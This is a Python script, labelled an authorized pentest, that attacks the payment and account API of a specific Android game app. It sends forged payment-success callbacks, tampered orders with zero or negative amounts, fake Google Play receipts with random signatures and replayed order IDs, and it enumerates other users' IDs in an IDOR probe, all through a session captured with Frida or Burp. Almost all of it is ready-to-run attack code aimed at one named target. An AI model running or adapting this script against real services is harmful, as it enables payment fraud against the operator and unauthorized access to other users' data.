"""
CRITICAL: Payment Endpoint Bypass Tests — com.h5bi.winr v1.0.1
Endpoints: /v1/payment/paySuccess, /v1/auth/createOrder

SCOPE: Authorized pentest only. Tests for:
  1. Payment callback forgery (/v1/payment/paySuccess without real payment)
  2. Order ID replay attacks
  3. Parameter tampering (amount, currency, product)
  4. Google Play receipt forgery (/v1/user/postGooglePlayVerify)
  5. Missing server-side validation

Smali-confirmed /v1/payment/paySuccess params (com.qk.a.a.c.b$5.run()):
  uid, username, orderAmount, cpOrderNo, goodsID, goodsName, currency,
  gameRoleId, gameRoleName, gameRoleLevel, gameRoleServerId, gameRoleServerName
  + sign params added by b.a(HashMap): uid, username, token, sign, os, usermode, appKey

PREREQUISITE: Fill CAPTURED_SESSION from Frida/Burp output.

Usage: python3 02_payment_bypass.py
"""

import json
import time
import uuid
import urllib3
import requests
from sign_helper import QuickGameSession, SERVERS, APP_KEY, md5

urllib3.disable_warnings()


# ──────────────────────────────────────────────────────────────────────────────
# FILL THESE from Frida/Burp capture (Frida script 02_hook_signing.js)
# ──────────────────────────────────────────────────────────────────────────────
CAPTURED_SESSION = QuickGameSession(
    uid="FILL_UID",          # e.g. "8472916"
    username="FILL_USER",    # e.g. "guest_8472916"
    token="FILL_TOKEN",      # e.g. "a3f9b2c1d..."
    os_type="android",
    usermode=0,
    server=SERVERS["account_primary"],
)


def log(label: str, resp: requests.Response):
    print(f"\n{'='*55}")
    print(f"  TEST: {label}")
    print(f"  URL:  {resp.url}")
    print(f"  Status: {resp.status_code}")
    try:
        data = resp.json()
        print(f"  JSON: {json.dumps(data, indent=2)[:500]}")
    except Exception:
        print(f"  Body: {resp.text[:400]}")


# ─── Test 1: Direct paySuccess call with crafted order ────────────────────────
def test_paysuccess_forgery():
    """
    Attempt to notify the server of a successful payment without completing one.
    The server should validate the payment against the payment provider,
    but if it trusts the client — this grants in-game currency.
    """
    fake_order_id = f"PENTEST_{int(time.time())}_{uuid.uuid4().hex[:8].upper()}"

    # Typical paySuccess params inferred from QuickGame SDK source
    payloads = [
        # Payload 1: Minimal — just order ID
        {
            "orderId":     fake_order_id,
            "payType":     "google",
            "productId":   "com.h5bi.winr.crystal_01",
            "productName": "Crystal Pack",
            "amount":      "0.99",
            "currencyType": "USD",
            "extra":       "{}",
        },
        # Payload 2: With receipt token (empty / malformed)
        {
            "orderId":      fake_order_id + "_2",
            "payType":      "google",
            "purchaseToken": "FORGED_TOKEN_" + uuid.uuid4().hex,
            "productId":    "com.h5bi.winr.crystal_01",
            "amount":       "0.99",
            "receipt":      "{}",
        },
        # Payload 3: amount=0 (zero-value order)
        {
            "orderId":     fake_order_id + "_3",
            "payType":     "google",
            "productId":   "com.h5bi.winr.vip_pack",
            "amount":      "0.00",
            "currencyType": "USD",
        },
    ]

    for i, payload in enumerate(payloads):
        resp = CAPTURED_SESSION.post("/v1/payment/paySuccess", data=payload)
        log(f"paySuccess forgery #{i+1}", resp)


# ─── Test 1b: paySuccess with EXACT smali-confirmed params ───────────────────
def test_paysuccess_exact_params():
    """
    Use parameters confirmed from smali analysis of com.qk.a.a.c.b$5.run().
    These are the REAL fields the SDK sends — more likely to pass server validation.
    Fill cpOrderNo from createOrder response (or generate one).
    """
    fake_order = f"PENTEST_{int(time.time())}"
    payload = {
        # Auth params (added by sign helper)
        # Non-auth params confirmed from smali:
        "orderAmount":       "0.99",          # float as string
        "cpOrderNo":         fake_order,       # client-side orderId
        "goodsID":           "com.h5bi.winr.crystal_01",
        "goodsName":         "Crystal x100",
        "currency":          "USD",
        "gameRoleId":        "1",
        "gameRoleName":      "TestHero",
        "gameRoleLevel":     "1",
        "gameRoleServerId":  "1",
        "gameRoleServerName": "Server1",
    }
    resp = CAPTURED_SESSION.post("/v1/payment/paySuccess", data=payload)
    log("paySuccess — exact smali params", resp)


# ─── Test 2: createOrder parameter tampering ──────────────────────────────────
def test_create_order_tamper():
    """
    Create order with manipulated amount.
    Check if server validates amount server-side or trusts client.
    """
    # First create a legitimate structure, then manipulate
    test_cases = [
        {"productId": "com.h5bi.winr.crystal_01", "amount": "0.01",   "currencyType": "USD"},
        {"productId": "com.h5bi.winr.crystal_big", "amount": "-1.00", "currencyType": "USD"},  # negative
        {"productId": "com.h5bi.winr.crystal_01",  "amount": "0.00",  "currencyType": "USD"},  # zero
        {"productId": "com.h5bi.winr.vip_999",     "amount": "0.99",  "currencyType": "USD"},  # wrong product
    ]

    for i, data in enumerate(test_cases):
        resp = CAPTURED_SESSION.post("/v1/auth/createOrder", data=data)
        log(f"createOrder tamper #{i+1} amount={data['amount']}", resp)


# ─── Test 3: Google Play receipt forgery ─────────────────────────────────────
def test_google_play_receipt_forge():
    """
    Submit a malformed/forged Google Play purchase receipt.
    If the server doesn't verify with Google's API, it may credit the account.
    """
    # Minimal valid-looking Google Play receipt structure
    fake_receipt = {
        "packageName":    "com.h5bi.winr",
        "productId":      "com.h5bi.winr.crystal_01",
        "purchaseTime":   int(time.time() * 1000),
        "purchaseState":  0,  # 0 = purchased
        "purchaseToken":  "forged_" + uuid.uuid4().hex * 2,
        "orderId":        f"GPA.3300-1234-5678-{uuid.uuid4().hex[:5].upper()}",
        "autoRenewing":   False,
        "acknowledged":   False,
    }

    # Google Play signature (forged — random bytes as base64)
    import base64, os
    fake_signature = base64.b64encode(os.urandom(256)).decode()

    payloads = [
        # Without signature
        {
            "receipt":    json.dumps(fake_receipt),
            "productId":  "com.h5bi.winr.crystal_01",
            "orderId":    fake_receipt["orderId"],
        },
        # With forged signature
        {
            "receipt":    json.dumps(fake_receipt),
            "signature":  fake_signature,
            "productId":  "com.h5bi.winr.crystal_01",
            "orderId":    fake_receipt["orderId"],
        },
        # Just the token (some servers only check purchaseToken)
        {
            "purchaseToken": fake_receipt["purchaseToken"],
            "productId":     "com.h5bi.winr.crystal_01",
            "packageName":   "com.h5bi.winr",
        },
    ]

    for i, payload in enumerate(payloads):
        resp = CAPTURED_SESSION.post("/v1/user/postGooglePlayVerify", data=payload)
        log(f"GooglePlay receipt forge #{i+1}", resp)


# ─── Test 4: Order replay attack ──────────────────────────────────────────────
def test_order_replay(real_order_id: str = None):
    """
    If you have a real orderId from one purchase, try replaying it
    to get credited twice (missing idempotency check).
    Fill real_order_id from Burp capture.
    """
    if not real_order_id:
        print("\n[SKIP] Order replay — provide real_order_id from Burp capture")
        return

    payload = {
        "orderId":      real_order_id,
        "payType":      "google",
        "productId":    "com.h5bi.winr.crystal_01",
        "amount":       "0.99",
        "currencyType": "USD",
    }

    # Try 3 times — server should reject after first
    for attempt in range(3):
        resp = CAPTURED_SESSION.post("/v1/payment/paySuccess", data=payload)
        log(f"Order replay #{attempt+1} orderId={real_order_id}", resp)
        time.sleep(1)


# ─── Test 5: getUserInfo IDOR ─────────────────────────────────────────────────
def test_idor_getuserinfo():
    """
    Test if /v1/auth/getUserInfo exposes other users' data by modifying uid.
    IDOR vulnerability: authenticated as user A, access user B's data.
    """
    if not CAPTURED_SESSION.uid or CAPTURED_SESSION.uid == "FILL_UID":
        print("\n[SKIP] IDOR test — fill CAPTURED_SESSION first")
        return

    own_uid = int(CAPTURED_SESSION.uid)
    test_uids = [str(own_uid + i) for i in range(-3, 4) if i != 0]

    print("\n" + "="*55)
    print("  TEST: IDOR — getUserInfo with other UIDs")

    for target_uid in test_uids:
        # Modify uid in request while keeping own valid token
        resp = CAPTURED_SESSION.get("/v1/auth/getUserInfo",
                                     extra_params={"uid": target_uid})
        status = resp.status_code
        if status == 200:
            try:
                data = resp.json()
                if data.get("code") == 0:  # success
                    print(f"  [IDOR ✓] uid={target_uid} => {json.dumps(data)[:200]}")
                else:
                    print(f"  [OK 200] uid={target_uid} code={data.get('code')} msg={data.get('msg')}")
            except Exception:
                print(f"  [200] uid={target_uid} => {resp.text[:100]}")
        else:
            print(f"  [{status}] uid={target_uid}")


if __name__ == "__main__":
    if CAPTURED_SESSION.uid == "FILL_UID":
        print("[!] WARNING: CAPTURED_SESSION not filled — tests will fail auth.")
        print("    Run Frida script 02_hook_signing.js first and fill the session.")
        print("    Running unauthenticated probes anyway...\n")

    print("[*] Payment Bypass Tests — com.h5bi.winr v1.0.1")
    print(f"    Session UID: {CAPTURED_SESSION.uid}")
    print(f"    Server: {CAPTURED_SESSION.server}\n")

    test_paysuccess_forgery()
    test_paysuccess_exact_params()
    test_create_order_tamper()
    test_google_play_receipt_forge()
    test_order_replay()    # fill real_order_id from Burp
    test_idor_getuserinfo()

    print("\n[*] Payment tests complete.")
